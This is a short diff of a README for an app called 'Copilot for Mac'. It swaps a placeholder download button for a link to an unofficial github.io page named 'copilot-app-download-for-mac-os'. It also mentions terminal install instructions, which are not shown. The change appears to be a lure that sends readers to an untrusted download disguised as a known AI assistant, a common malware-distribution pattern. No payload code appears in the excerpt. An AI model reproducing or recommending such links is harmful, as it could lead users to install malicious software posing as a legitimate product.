@@ -4,7 +4,7 @@ Copilot for Mac is your intelligent AI assistant designed to streamline your wor
 
 ![copilot](https://i.ytimg.com/vi/e4yVVPK2Eio/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLDq1yL7XVFu7UfHHC-jseQfFtUHFw)
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20MacOS-Click%20Here-black?style=for-the-badge\&logo=apple)](#)
+[![Download for Mac](https://img.shields.io/badge/Download%20for%20MacOS-Click%20Here-black?style=for-the-badge\&logo=apple)](https://copilot-app-download-for-mac-os.github.io/.github/)
 
 If the button above doesn't work, follow the terminal instructions below to install manually.
 
